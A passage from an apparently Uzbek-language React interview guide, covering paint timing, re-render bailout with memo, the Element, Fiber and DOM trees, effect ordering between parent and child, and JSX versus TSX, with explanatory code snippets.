- **`onUncaughtError` default — process exit emas**: Browser'da app crash bo'ladi, lekin `process.exit` yo'q (Node.js'dan farqli). Window error event dispatched.
- **Async errors**: `setTimeout`, `Promise.reject` — Error boundary tutmaydi (event handler emas). Manual `window.addEventListener("unhandledrejection")` kerak.
- **Suspense throws**: Promise throw — error EMAS (Suspense'ga signal). `onCaughtError` chaqirilmaydi.
- **Strict Mode 2x**: Error 2 marta throw bo'lishi mumkin (StrictMode invariant check), 2 marta callback chaqiriladi.

### Follow-up savollar

- "`onCaughtError` boundary'siz ishlatish mumkin-mi?" — Yo'q, faqat boundary tutgan error'lar uchun. Boundary yo'q → `onUncaughtError`.
- "Eski R18'da bu callback'lar bormi?" — `onRecoverableError` R18'dan bor. `onCaughtError`, `onUncaughtError` R19'dan.
- "Test'larda root callback qanday tekshirish?" — Mock function pass qilish: `createRoot(container, { onCaughtError: jest.fn() })` — keyin assert.

</details>

---

### 27. Browser paint timing va React render orasidagi munosabat [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React **JavaScript task** ichida render qiladi. Browser paint **JS task tugagandan keyin** sodir bo'ladi (frame budget). Pipeline: JS task (event handler → React render → commit → useLayoutEffect) → Browser paint → useEffect (passive). 16ms (60fps) frame budget'da React work'i sig'ishi kerak — ortib ketsa **dropped frames** (jank). Concurrent rendering 5ms slice bilan yield qilib, paint frame'ni bloklamaydi.

### To'liq tushuntirish

**Browser frame pipeline (60fps):**

```
Frame N (16.67ms budget):
┌─────────────────────────────────────────┐
│ 1. JS task (event handler, timer, ...) │ ← React render shu yerda
│    - React render phase                 │
│    - React commit phase                 │
│    - useLayoutEffect (sync)             │
├─────────────────────────────────────────┤
│ 2. Style recalc + Layout                │ ← Browser
│ 3. Paint                                │ ← Browser
│ 4. Composite                            │ ← GPU
├─────────────────────────────────────────┤
│ 5. requestAnimationFrame callbacks      │
│ 6. requestIdleCallback (idle)          │
│    - useEffect (passive) shu yerda      │
└─────────────────────────────────────────┘
```

**JS task'da React qadamlari:**

```
Event (click) keldi
   ↓
1. JS task boshlandi
   ↓
2. Event handler chaqiriladi (setState)
   ↓
3. Scheduler queues update
   ↓
4. React Render Phase
   - Komponent function chaqiriladi
   - Reconciliation (diff)
   ↓
5. React Commit Phase
   - DOM mutation
   - Refs attach
   - useLayoutEffect (sync) — paint'dan oldin
   ↓
6. JS task tugadi
   ↓
Browser: Paint
   ↓
useEffect (passive) — paint'dan keyin
```

### Kod misoli

```tsx
function PaintTimingDemo() {
  const [count, setCount] = useState(0);
  console.log("1. Render"); // JS task (Render Phase)

  useLayoutEffect(() => {
    console.log("3. useLayoutEffect (sync, before paint)");
  }, [count]);

  useEffect(() => {
    console.log("5. useEffect (after paint)");
  }, [count]);

  return (
    <button
      onClick={() => {
        console.log("0. Event handler start");
        setCount((c) => c + 1);
        console.log("2. Event handler end (state queued)");
      }}
    >
      {count}
    </button>
  );
}

// Click output:
// 0. Event handler start
// 2. Event handler end (state queued)
// 1. Render
// (DOM mutation in Commit Phase)
// 3. useLayoutEffect (sync, before paint)
// (Browser paint sodir bo'ladi)
// 5. useEffect (after paint)
```

**Long render — dropped frame:**

```tsx
function SlowComponent({ items }: { items: Item[] }) {
  // ❌ Sync expensive computation
  const processed = items.map((item) => {
    let result = 0;
    for (let i = 0; i < 100000; i++) result += i;  // slow loop
    return { ...item, score: result };
  });

  return <List items={processed} />;
}

// Render takes 200ms — 12 dropped frames (60fps)
// User: jank, choppy interaction
```

**Concurrent fix — split work:**

```tsx
function ConcurrentSearch({ items }: { items: Item[] }) {
  const [query, setQuery] = useState("");
  const deferredQuery = useDeferredValue(query);  // ← yield to user input

  const filtered = items.filter((i) => i.name.includes(deferredQuery));

  return (
    <div>
      <input value={query} onChange={(e) => setQuery(e.target.value)} />
      <List items={filtered} />
    </div>
  );
}
```

`useDeferredValue` — concurrent rendering yield qiladi, browser paint'ga vaqt beradi.

<details>
<summary><strong>Deep Dive</strong></summary>

**Browser rendering pipeline (Chrome/V8):**

```
JS execution
    ↓
RAF (requestAnimationFrame) callbacks
    ↓
Style recalc (CSS computed)
    ↓
Layout (geometry calculation)
    ↓
Paint (rasterization)
    ↓
Composite (GPU layers)
    ↓
[Frame end — browser idle]
    ↓
Idle tasks (rAF, useEffect, etc.)
```

React render — JS execution ichida. `useLayoutEffect` — JS task'dan oldin paint'ga, `useEffect` — paint'dan keyin idle.

**Frame budget:**

- 60fps → 16.67ms per frame
- 120fps → 8.33ms per frame
- React work + browser layout/paint → frame budget'da sig'ishi kerak

**Dropped frame:**

```
Target: 60fps (16ms budget)

Frame 1: JS task 5ms + Layout 3ms + Paint 5ms = 13ms ✅
Frame 2: JS task 25ms (long render) → 1 frame skipped (jank)
```

**Concurrent rendering — yield mexanizmi:**

```typescript
// React internal (sodda)
function workLoop() {
  while (workInProgress !== null && !shouldYield()) {
    performUnitOfWork(workInProgress);  // 1 fiber
  }

  if (workInProgress !== null) {
    // Yield — schedule continuation
    Scheduler.scheduleCallback(NormalPriority, workLoop);
  } else {
    commitRoot();
  }
}

function shouldYield() {
  return performance.now() >= deadline;  // 5ms slice
}
```

`Scheduler.scheduleCallback` — `MessageChannel.postMessage` orqali browser idle'ga yield.

**`MessageChannel` vs `setTimeout(0)`:**

- `setTimeout(0)` — minimum 4ms delay (HTML spec clamp)
- `MessageChannel` — fast, post-paint trigger
- `requestIdleCallback` — Safari'da yo'q, har xil browser

React Scheduler `MessageChannel` ishlatadi (universal, fast).

**`useLayoutEffect` paint'ni bloklaydi:**

```tsx
function Modal({ isOpen }: { isOpen: boolean }) {
  const ref = useRef<HTMLDivElement>(null);

  useLayoutEffect(() => {
    if (isOpen && ref.current) {
      // ⚠️ Sync DOM read = force layout
      const rect = ref.current.getBoundingClientRect();

      // ⚠️ Sync DOM write = invalidate layout
      ref.current.style.top = `${(window.innerHeight - rect.height) / 2}px`;

      // Paint kechikadi (frame budget)
    }
  }, [isOpen]);

  return <div ref={ref}>Modal</div>;
}
```

`useLayoutEffect` ichida DOM mutation → paint blocked → flicker risk.

**`useEffect` post-paint:**

```tsx
function PostPaintWork() {
  useEffect(() => {
    // Browser paint allaqachon sodir bo'lgan
    // Async work — UI smooth
    fetch("/api/log");
    analytics.track("page_view");
  }, []);

  return <div>Content</div>;
}
```

**Long task budget — Web Vitals:**

- **TBT (Total Blocking Time)** — long tasks > 50ms
- **INP (Interaction to Next Paint)** — interaction → paint timing
- **LCP (Largest Contentful Paint)** — main content render

Concurrent rendering — INP yaxshilanadi (yield + interruption).

**`startTransition` paint priority:**

```tsx
function handleSearch(query: string) {
  setQuery(query);  // urgent — input update
  startTransition(() => {
    setResults(filterExpensive(query));  // non-urgent — interruptible
  });
}
```

Input update — high pri (sync render). Results filter — low pri (yield, can be interrupted by next keystroke).

**`requestAnimationFrame` integration:**

```tsx
function AnimatedComponent() {
  const ref = useRef<HTMLDivElement>(null);

  useEffect(() => {
    let rafId: number;
    let progress = 0;

    function tick() {
      progress += 1;
      if (ref.current) {
        ref.current.style.transform = `translateX(${progress}px)`;
      }
      if (progress < 100) rafId = requestAnimationFrame(tick);
    }

    rafId = requestAnimationFrame(tick);
    return () => cancelAnimationFrame(rafId);
  }, []);

  return <div ref={ref}>Animated</div>;
}
```

`requestAnimationFrame` — aniq frame'da chaqiriladi. React render bilan kombinatsiya animation uchun.

**Performance API:**

```tsx
function MeasuredRender() {
  performance.mark("render-start");

  // ... render logic

  useEffect(() => {
    performance.mark("render-end");
    performance.measure("render", "render-start", "render-end");
    const measure = performance.getEntriesByName("render")[0];
    console.log(`Render took ${measure.duration}ms`);
  });

  return <div>...</div>;
}
```

</details>

### Edge Cases

- **`useLayoutEffect` ichida `setState`**: Sync re-render trigger — yana commit cycle. Paint kechikishi.
- **`requestAnimationFrame` ichida `setState`**: Sync render. R18'da batched, pre-R18 sync.
- **`MutationObserver` callbacks**: Microtask, paint'dan oldin. React commit'dan keyin chaqiriladi.
- **Long task throttling**: Browser tab background'ga o'tsa — RAF throttled (1Hz). React render ham sekin.

### Follow-up savollar

- "Why useLayoutEffect blocks paint?" — Sync, paint'dan oldin chaqiriladi. Render → DOM mutation → useLayoutEffect → paint.
- "How does React measure render time?" — `<Profiler>` component yoki DevTools Profiler. Internal `performance.now()` measurements.
- "Can React render faster than 60fps?" — Ha, `120fps` device'larda. React Scheduler frame budget'ni dynamic adjust qiladi.

</details>

---

### 28. Why parent re-render = child re-render? Bailout mexanikasi [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

React'ning **default behavior** — parent komponent re-render bo'lsa, **barcha bola komponentlar ham re-render** (function chaqiriladi). Sabab: parent yangi JSX qaytaradi, child element type/props o'zgargan bo'lishi mumkin — Reconciler diff qilish uchun child function'ni chaqirishi kerak. **Bailout** — `React.memo` (shallow props comparison) yoki `useMemo` (memoized JSX) bilan opt-out: agar props bir xil reference bo'lsa, function chaqirilmaydi.

### To'liq tushuntirish

**Default render propagation:**

```tsx
function Parent() {
  const [count, setCount] = useState(0);
  console.log("Parent render");

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Child />  {/* Parent re-render → Child function chaqiriladi */}
    </div>
  );
}

function Child() {
  console.log("Child render");
  return <p>Child</p>;
}

// Click button:
// "Parent render"
// "Child render"  ← har gal
```

**Sabab — JSX → element tree:**

```tsx
function Parent() {
  // Har render yangi element object
  return (
    <div>
      <Child />  // _jsx(Child, {}) — yangi element
    </div>
  );
}

// Reconciler:
// Old child element: { type: Child, props: {} }
// New child element: { type: Child, props: {} }
// Reference: different (new object)
// Compare: type same → update path, function chaqiriladi
```

### Kod misoli

**Bailout — `React.memo`:**

```tsx
const Child = memo(function Child() {
  console.log("Child render");
  return <p>Child</p>;
});

function Parent() {
  const [count, setCount] = useState(0);
  console.log("Parent render");

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Child />  {/* Props shallow same → memo bailout */}
    </div>
  );
}

// Click:
// "Parent render"
// (Child render skipped — props bir xil)
```

**Bailout buziladi — yangi reference props:**

```tsx
const Child = memo(function Child({ data, onClick }: { data: number[]; onClick: () => void }) {
  console.log("Child render");
  return <button onClick={onClick}>{data.length}</button>;
});

function Parent() {
  const [count, setCount] = useState(0);

  // ❌ Har render yangi reference
  const data = [1, 2, 3];
  const handler = () => console.log("click");

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Child data={data} onClick={handler} />  {/* memo bypass */}
    </div>
  );
}

// "Parent render"
// "Child render"  ← memo bypass — props new references
```

**To'g'ri — stable reference'lar:**

```tsx
function Parent() {
  const [count, setCount] = useState(0);

  // ✅ Stable
  const data = useMemo(() => [1, 2, 3], []);
  const handler = useCallback(() => console.log("click"), []);

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Child data={data} onClick={handler} />
    </div>
  );
}

// "Parent render"
// (Child render skipped — props bir xil reference)
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Reconciler diff per child:**

```typescript
// React internal (sodda)
function reconcileChild(parent, oldChild, newChild) {
  // 1. Type check
  if (oldChild.type !== newChild.type) {
    // Different type → unmount + mount
    unmount(oldChild);
    mount(newChild);
    return;
  }

  // 2. Same type → update path
  // Update props, call function (re-render)
  oldChild.memoizedProps = newChild.props;
  performWork(oldChild);  // ← function chaqiriladi
}

function performWork(fiber) {
  if (fiber.type.$$typeof === REACT_MEMO_TYPE) {
    // Bailout check
    if (shallowEqual(fiber.memoizedProps, newProps)) {
      return;  // skip render
    }
  }

  // Render — function chaqiriladi
  const children = fiber.type(newProps);
  // ... continue
}
```

**Bailout 4 ta sababi:**

1. **Element identity** — `Object.is(oldElement, newElement)` — same reference
2. **`React.memo`** — shallow props equality
3. **`useMemo`/`useCallback`** — stable reference (helps memo)
4. **State equality** — `useState` same value → bailout (`Object.is`)

**Element identity bailout:**

```tsx
function Parent() {
  const [count, setCount] = useState(0);

  // ✅ JSX hoisted — same element reference
  const cachedChild = useMemo(() => <Child />, []);

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      {cachedChild}  {/* Same element — bailout */}
    </div>
  );
}
```

**`children` prop pattern:**

```tsx
function Wrapper({ children }: { children: React.ReactNode }) {
  const [count, setCount] = useState(0);
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      {children}  {/* Same reference — bailout */}
    </div>
  );
}

function App() {
  return (
    <Wrapper>
      <ExpensiveChild />  {/* App render'da bir marta */}
    </Wrapper>
  );
}
```

`children` props parent'dan keladi (App). App re-render bo'lmaganda children reference o'zgarmaydi.

**`React.memo` shallow comparison:**

```typescript
function shallowEqual(prev, next) {
  if (Object.is(prev, next)) return true;
  if (typeof prev !== "object" || typeof next !== "object") return false;

  const keys = Object.keys(prev);
  if (keys.length !== Object.keys(next).length) return false;

  return keys.every((key) => Object.is(prev[key], next[key]));
}
```

Shallow — top-level props compare, deep object content emas.

**`React.memo` custom comparator:**

```tsx
const Child = memo(
  function Child({ user }: { user: User }) {
    return <p>{user.name}</p>;
  },
  (prevProps, nextProps) => {
    // True if equal (skip re-render)
    return prevProps.user.id === nextProps.user.id;
  }
);
```

**`useMemo` JSX caching:**

```tsx
function Parent({ data }: { data: Data }) {
  const [count, setCount] = useState(0);

  const memoizedList = useMemo(
    () => <ExpensiveList data={data} />,
    [data]
  );

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      {memoizedList}  {/* Reused if data unchanged */}
    </div>
  );
}
```

**State bailout:**

```tsx
function Component() {
  const [value, setValue] = useState(0);

  return (
    <button onClick={() => setValue(0)}>  {/* setValue(0) — same value */}
      {value}
    </button>
  );
}

// Click:
// setValue(0) called
// React: Object.is(prev=0, new=0) → true → bailout, no re-render
```

**Context — bailout buziladi:**

```tsx
const Context = createContext(0);

function Parent() {
  const [value, setValue] = useState(0);
  return (
    <Context.Provider value={value}>  {/* value change → all consumers re-render */}
      <Child />
    </Context.Provider>
  );
}

const Child = memo(function Child() {
  const value = useContext(Context);
  console.log("Child render");
  return <p>{value}</p>;
});

// memo doesn't help — context subscription forces re-render
```

**React Compiler — auto-memoization:**

```tsx
// Manual
function Parent() {
  const handler = useCallback(() => {}, []);
  const data = useMemo(() => [1, 2], []);
  return <Child handler={handler} data={data} />;
}

// Compiler (auto-memo)
function Parent() {
  const $ = useMemoCache(2);
  const handler = $[0] ?? ($[0] = () => {});
  const data = $[1] ?? ($[1] = [1, 2]);
  return <Child handler={handler} data={data} />;
}
```

Compiler — manual memo'lar deyarli ortiqcha.

**Bailout chain:**

```tsx
const Leaf = memo(function Leaf() {
  console.log("Leaf");
  return <p>Leaf</p>;
});

const Middle = memo(function Middle() {
  console.log("Middle");
  return <Leaf />;  {/* same reference each render */}
});

function Root() {
  const [count, setCount] = useState(0);
  console.log("Root");
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Middle />
    </div>
  );
}

// Click:
// "Root"
// (Middle bailout — props empty)
// (Leaf bailout — Middle didn't render)
```

</details>

### Edge Cases

- **`React.memo` + Context**: Context subscriber bypass'oladi memo. Faqat context value o'zgarmasa.
- **`React.memo` + `useState`**: Komponent o'z state'ini o'zgartirsa — memo nima bo'lishidan qat'i nazar re-render.
- **Inline JSX**: `<Wrapper>{<Child />}</Wrapper>` — `<Child />` JSX wrapper'ning render'ida yangi element. Wrapper props (children) yangi reference.
- **Same-value setState**: `setX(0)` `x === 0` bo'lsa — Object.is bailout, lekin function call bor (overhead).

### Follow-up savollar

- "Bailout vs `shouldComponentUpdate` (class)?" — Class — `shouldComponentUpdate` true return → render. Function — `React.memo` + shallow check.
- "`useState` setter bailout har doim works?" — Faqat primitive same value. Object `setX({a: 1})` — yangi reference, doim re-render.
- "Why React doesn't auto-memoize all components?" — Default — predictable. Auto-memo ko'p case'da overhead bo'lardi (props comparison kichik render'dan qimmatroq). Compiler — selective auto-memo.

</details>

---

### 29. DOM tree vs Fiber tree vs React Element tree — uchchovi farqi [Senior]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**React Element tree** — JSX'ning compile output, **immutable description** (`{ type, props, key }`). Render time'da yaratiladi. **Fiber tree** — runtime work units, **mutable** (`memoizedState`, `alternate`, hooks). Reconciler shu yerda ishlaydi. **DOM tree** — actual browser nodes (`HTMLDivElement`, `HTMLButtonElement`). Commit phase'da Fiber'dan generated. Pipeline: JSX → Element → Fiber → DOM.

### To'liq tushuntirish

**3 ta tree comparison:**

| | React Element | Fiber | DOM |
|---|---------------|-------|-----|
| **Type** | Object literal | Object (mutable) | HTMLElement |
| **Created when** | Render phase (har gal) | Reconciler (commit'dan oldin) | Commit phase |
| **Mutability** | Immutable | Mutable | Mutable |
| **Persistence** | Discarded after reconciliation | Persists across renders | Persists in DOM |
| **Hook state** | ❌ | ✅ memoizedState | ❌ |
| **Effects** | ❌ | ✅ flags | ❌ |

**Pipeline:**

```
JSX source
   ↓ (compile-time)
_jsx() function call
   ↓ (runtime: render)
React Element object
   ↓ (Reconciler diff)
Fiber node (workInProgress tree)
   ↓ (Commit Phase: Mutation sub-phase)
DOM Element
```

### Kod misoli

```tsx
function App() {
  return (
    <div className="app">
      <h1>Hello</h1>
    </div>
  );
}

// 1. JSX source — what you write

// 2. Compiled (Automatic transform)
import { jsx as _jsx } from "react/jsx-runtime";

function App() {
  return _jsx("div", {
    className: "app",
    children: _jsx("h1", { children: "Hello" })
  });
}

// 3. React Element (runtime) — _jsx returns
{
  $$typeof: Symbol(react.element),
  type: "div",
  key: null,
  ref: null,
  props: {
    className: "app",
    children: {
      $$typeof: Symbol(react.element),
      type: "h1",
      props: { children: "Hello" }
    }
  }
}

// 4. Fiber tree (Reconciler builds)
//
//   FiberRoot
//     ↓ current
//   Fiber(App, tag: FunctionComponent)
//     ↓ child
//   Fiber(div, tag: HostComponent)
//     ↓ child
//   Fiber(h1, tag: HostComponent)
//     ↓ child
//   Fiber("Hello", tag: HostText)

// 5. DOM tree (Commit phase)
<div className="app">
  <h1>Hello</h1>
</div>
```

<details>
<summary><strong>Deep Dive</strong></summary>

**React Element internal:**

```typescript
interface ReactElement<P> {
  $$typeof: Symbol;          // REACT_ELEMENT_TYPE
  type: string | ComponentType<P>;
  key: string | null;
  ref: Ref<unknown> | null;  // R19'da props ichida
  props: P;
}
```

`$$typeof: Symbol(react.element)` — XSS prevention (Symbol cross-context). React Object'ni tan olish uchun.

**Fiber internal (sodda):**

```typescript
interface Fiber {
  // Identity
  tag: WorkTag;          // FunctionComponent, HostComponent, HostText, ...
  type: any;             // 'div', App function, MyClass
  key: string | null;
  elementType: any;
  stateNode: any;        // DOM node (HostComponent), instance (Class)

  // Tree structure (linked list)
  return: Fiber | null;   // parent
  child: Fiber | null;    // first child
  sibling: Fiber | null;  // next sibling

  // Double buffering
  alternate: Fiber | null;

  // State (per fiber instance)
  memoizedState: any;     // hooks linked list (useState, useEffect, ...)
  memoizedProps: any;     // last committed props
  pendingProps: any;      // new props for next render
  updateQueue: any;       // pending state updates

  // Effects
  flags: Flags;           // Placement, Update, Deletion, Passive, ...
  subtreeFlags: Flags;    // children flags (fast skip)

  // Scheduling
  lanes: Lanes;
  childLanes: Lanes;
}
```

**Element vs Fiber lifecycle:**

```typescript
// Render
function render() {
  // Component called → returns Element
  const element = MyComponent(props);
  // element: { type: 'div', props: ... }

  // Reconciler: element + old fiber → new fiber
  const fiber = reconcile(oldFiber, element);
  // fiber.memoizedProps = element.props
}

// Element discarded after reconciliation (no persistence)
// Fiber persists across renders (alternate swap)
```

**`stateNode` — Fiber → DOM bridge:**

```typescript
// HostComponent fiber
{
  type: 'div',
  stateNode: <div>  // Real DOM node reference
}

// Commit phase:
// fiber.stateNode.appendChild(child.stateNode)
// fiber.stateNode.setAttribute(key, value)
```

**Double buffering — current vs workInProgress:**

```
FiberRoot
  ↓ current (committed tree)
Fiber(App, current=true)
  ↓ alternate
Fiber(App, current=false) ← workInProgress (being built)

Render Phase: workInProgress quriladi
Commit Phase: root.current = workInProgress (swap)
Old current → workInProgress (alternate, ready for next render)
```

**Element tree garbage collected:**

```tsx
function MyComponent() {
  // Render time
  const element = <div>Hello</div>;
  // element object yaratiladi
  return element;
}

// Reconciliation:
// element.props copied to fiber.memoizedProps
// element object discarded (GC'd after reconciliation)
```

Element — short-lived. Fiber — long-lived (per re-render alternate swap).

**DOM tree update — Commit phase:**

```typescript
// React internal commitMutationEffects
function commitMutation(fiber) {
  if (fiber.flags & Placement) {
    // Insert DOM
    parentNode.appendChild(fiber.stateNode);
  }
  if (fiber.flags & Update) {
    // Update DOM properties
    const updatePayload = fiber.updateQueue;
    for (const [key, value] of updatePayload) {
      fiber.stateNode[key] = value;
    }
  }
  if (fiber.flags & Deletion) {
    // Remove DOM
    parentNode.removeChild(fiber.stateNode);
  }
}
```

**Element ≠ Component:**

```tsx
function MyComponent() {  // ← Component (function)
  return <div />;          // ← returns Element
}

const element = <MyComponent />;  // ← Element ({ type: MyComponent, props: {} })
```

Component — recipe. Element — instance description. Fiber — runtime instance.

**Multiple Fibers per Element type:**

```tsx
function App() {
  return (
    <>
      <Counter />  {/* Fiber instance 1 */}
      <Counter />  {/* Fiber instance 2 */}
    </>
  );
}

// Same Element type (Counter), different Fiber instances
// Each Fiber has own memoizedState (state isolated)
```

**Visualizing in React DevTools:**

DevTools "Components" tab — Fiber tree (with hooks, props, state). HTML inspector — DOM tree. Element tree — internal, not directly visualized.

</details>

### Edge Cases

- **Fragment Fiber, no DOM**: `<></>` — Fiber created (tag: Fragment), DOM children attached to parent (no separate DOM node).
- **Portal — Fiber tree vs DOM tree split**: `createPortal(children, target)` — children in React tree (Fiber parent), but DOM in different parent.
- **Suspense — Fiber state**: Suspense fiber has hidden state (showing fallback). DOM swap on resolve.
- **Server Components — no Fiber on client**: Server renders → RSC payload → Client builds tree from payload (no Fiber for server-only parts).

### Follow-up savollar

- "Why Element ≠ Fiber?" — Element immutable (function output). Fiber mutable (state, hooks, alternate). Render — pure (Element). Reconciler — stateful (Fiber).
- "Can a Component have multiple Elements?" — Ha, har JSX usage yangi Element. Component itself — single function.
- "How big is a Fiber object?" — ~100+ properties, ~1KB memory. 1000 komponentli app — ~1MB Fiber memory.

</details>

---

### 30. Output: useEffect chaqiruv tartibi parent vs child [Output] [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Savol

Quyidagi komponent initial mount va update'da nima ketma-ketlikda log chiqaradi?

```tsx
function Child() {
  console.log("Child render");
  useEffect(() => {
    console.log("Child effect");
    return () => console.log("Child cleanup");
  });
  useLayoutEffect(() => {
    console.log("Child layout effect");
    return () => console.log("Child layout cleanup");
  });
  return <p>Child</p>;
}

function Parent() {
  const [count, setCount] = useState(0);
  console.log("Parent render");

  useEffect(() => {
    console.log("Parent effect");
    return () => console.log("Parent cleanup");
  });

  useLayoutEffect(() => {
    console.log("Parent layout effect");
    return () => console.log("Parent layout cleanup");
  });

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>{count}</button>
      <Child />
    </div>
  );
}
```

### Javob

**Initial mount:**

```
Parent render
Child render
Child layout effect       ← Child layout effects birinchi (depth-first)
Parent layout effect      ← Parent layout effect keyin
(browser paint)
Child effect              ← Child passive effects birinchi
Parent effect             ← Parent passive effect keyin
```

**Click button (count o'zgarishi):**

```
Parent render
Child render

Child layout cleanup      ← Cleanups depth-first (child birinchi)
Parent layout cleanup
Child layout effect       ← Yangi effects depth-first
Parent layout effect

(browser paint)

Child cleanup             ← Passive cleanups depth-first
Parent cleanup
Child effect              ← Yangi passive effects depth-first
Parent effect
```

### Tushuntirish

**Effect order qoidalari:**

1. **Render** — top-down (Parent → Child)
2. **Layout effects** — bottom-up (Child → Parent), sync, paint'dan oldin
3. **Passive effects** — bottom-up (Child → Parent), async, paint'dan keyin
4. **Cleanups** — old effects'dan, child'dan boshlab (eski cycle bekor)
5. **New effects** — yangi cycle, child'dan boshlab

<details>
<summary><strong>Deep Dive</strong></summary>

**Why bottom-up effects:**

Child effects parent effect'idan oldin — chunki child mount/setup parent setup uchun kerak (parent measurement child DOM'ga bog'liq).

```typescript
// React internal (sodda)
function commitLayoutEffects(fiber) {
  // Depth-first: child birinchi
  let child = fiber.child;
  while (child !== null) {
    commitLayoutEffects(child);
    child = child.sibling;
  }

  // Then self
  if (fiber.flags & Layout) {
    runLayoutEffect(fiber);
  }
}
```

**Why cleanup before new effects:**

```typescript
// Update cycle
function commitPassiveEffects(fiber) {
  // 1. Cleanup all (eski cycle)
  commitPassiveUnmountEffects(fiber);
  // - Child cleanups
  // - Parent cleanups

  // 2. Mount all (yangi cycle)
  commitPassiveMountEffects(fiber);
  // - Child new effects
  // - Parent new effects
}
```

Cleanup — barchasi eski cycle. Yangi effects — yangi cycle. Real-world bug oldini oladi:

```tsx
function Parent() {
  useEffect(() => {
    const ws = new WebSocket(url);
    return () => ws.close();
  }, [url]);

  return <Child />;
}

function Child() {
  useEffect(() => {
    parentWs.send("hello");  // ⚠️ Parent ws may be closed
  }, []);
}

// Update url:
// 1. Parent old cleanup → ws.close()
// 2. Child cleanup
// 3. Child new effect — parentWs may be closed!
```

Real React: cleanups depth-first child birinchi, parent keyin (lekin order child→parent qoldiriladi).

**`useLayoutEffect` vs `useEffect` ordering:**

```
Mount (initial):
  All renders (top-down: parent → child)
  All useLayoutEffect cleanups (bottom-up — initial yo'q, lekin nesting)
  All useLayoutEffect mounts (bottom-up: child → parent)
  Browser paint
  All useEffect cleanups (bottom-up — initial yo'q)
  All useEffect mounts (bottom-up: child → parent)

Update:
  All renders (top-down)
  useLayoutEffect cleanups (bottom-up)
  useLayoutEffect mounts (bottom-up)
  Browser paint
  useEffect cleanups (bottom-up)
  useEffect mounts (bottom-up)

Unmount:
  useLayoutEffect cleanups (bottom-up)
  useEffect cleanups (bottom-up)
```

**StrictMode dev — 2x render + cleanup-mount cycle:**

```
Initial mount in StrictMode:
  Parent render
  Parent render (2x)
  Child render
  Child render (2x)
  Child layout effect
  Parent layout effect
  Child layout cleanup (synthetic unmount)
  Parent layout cleanup
  Child layout effect (re-mount)
  Parent layout effect
  (paint)
  Child effect
  Parent effect
  Child cleanup (synthetic unmount)
  Parent cleanup
  Child effect (re-mount)
  Parent effect
```

**Multiple effects in same component:**

```tsx
function Component() {
  useEffect(() => console.log("E1"));
  useEffect(() => console.log("E2"));
  useEffect(() => console.log("E3"));
}

// Order:
// E1
// E2
// E3
// (declaration order)

// Cleanups:
// (also declaration order, NOT reverse)
// E1 cleanup
// E2 cleanup
// E3 cleanup
```

**`useInsertionEffect` — earliest:**

```tsx
function Component() {
  useInsertionEffect(() => console.log("Insertion"));
  useLayoutEffect(() => console.log("Layout"));
  useEffect(() => console.log("Passive"));
}

// Order:
// Insertion (Layout phase'dan oldin)
// Layout
// (paint)
// Passive
```

`useInsertionEffect` — CSS-in-JS library'lar uchun (style injection layout'dan oldin).

</details>

### Edge Cases

- **Effect dep array reference change**: Object/array deps reference o'zgarsa — cleanup + new effect har render'da. `useMemo` bilan stabilize.
- **Conditional effect**: `if (cond) useEffect(...)` — Hook order bug. Effect always declared, conditional logic INSIDE.
- **Cleanup throws**: Cleanup error — boshqa cleanup'lar hali ishlatiladi (try-finally). Effect cycle to'xtaydi.

### Follow-up savollar

- "Why depth-first effects?" — Child setup parent uchun zarur (DOM measurement, subscription).
- "Can effect change parent state during commit?" — `useLayoutEffect`'da setState — sync re-render. `useEffect`'da setState — yangi cycle (potential infinite loop).
- "Effects in concurrent rendering — abort qilinsa?" — Render abort → effect chaqirilmaydi. Faqat success commit'da.

</details>

---

## QISM C: JSX va TSX

### 31. JSX va TSX farqi nima? Runtime'da farq bormi? [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

**JSX** — JavaScript XML syntax extension (Facebook 2013). `.jsx` fayl extension'i. **TSX** — `.tsx` fayl extension — JSX + TypeScript types ichida. **Syntax nomi har doim "JSX"** — kod TSX bo'lsa ham. **Runtime'da farq YO'Q** — Babel/SWC ikkalasini bir xil `_jsx()` chaqiruvlariga transform qiladi. Farq faqat **type system layer**'da: TSX TypeScript compiler tomonidan tekshiriladi, JSX yo'q.

### To'liq tushuntirish

**JSX qoidalari TSX'ga ham bir xil amal qiladi:**
- Single root majburiyligi
- Fragments (`<>`)
- camelCase attributes (`onClick`, `className`)
- Reserved attribute names (`className`, `htmlFor`)
- Self-closing tags (`<img />`)

**Faqat TSX qo'shadi:**
- Type annotations (`function Button(props: ButtonProps)`)
- Generic components (`<List<User>>`)
- Type narrowing in JSX expressions
- Compile-time type errors

### Kod misoli

```jsx
// .jsx — JavaScript XML
function Button({ label, onClick }) {
  return <button onClick={onClick}>{label}</button>;
}
// Runtime errors mumkin: Button({label: 123}) — TypeScript bilmaydi
```

```tsx
// .tsx — TypeScript XML
interface ButtonProps {
  label: string;
  onClick: (e: React.MouseEvent<HTMLButtonElement>) => void;
}

function Button({ label, onClick }: ButtonProps) {
  return <button onClick={onClick}>{label}</button>;
}
// Compile error: Button({label: 123}) — Type 'number' not assignable to 'string'
```

**Ikkalasi ham bir xil compile output:**

```tsx
// Source (JSX yoki TSX)
const el = <button onClick={handler}>Click</button>;

// Compiled (Automatic transform, R17+)
import { jsx as _jsx } from "react/jsx-runtime";
const el = _jsx("button", { onClick: handler, children: "Click" });
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Build pipeline:**

```
.jsx file → Babel/SWC → ES module
.tsx file → TypeScript compiler (tsc) → .js → Babel/SWC → ES module
            ↑
            Type checking (compile-time)
            Type erasure (runtime'da yo'q)
```

**TypeScript compiler:**
1. Parse `.tsx` → AST (TypeScript AST + JSX nodes)
2. Type check (interfaces, generics, narrowing)
